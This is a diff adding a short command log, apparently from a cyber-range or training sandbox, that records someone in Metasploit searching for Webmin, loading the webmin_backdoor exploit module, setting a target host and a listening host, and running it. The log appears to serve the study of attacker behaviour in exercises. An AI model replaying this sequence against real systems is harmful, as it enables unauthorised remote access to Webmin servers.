@@ -1,0 +1,6 @@
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:30:28.823012+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:32:27.897998+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor "}
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:32:42.019784+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:33:09.962295+02:00", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:33:19.281284+02:00", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "44", "timestamp_str": "2020-07-15T09:33:42.979849+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
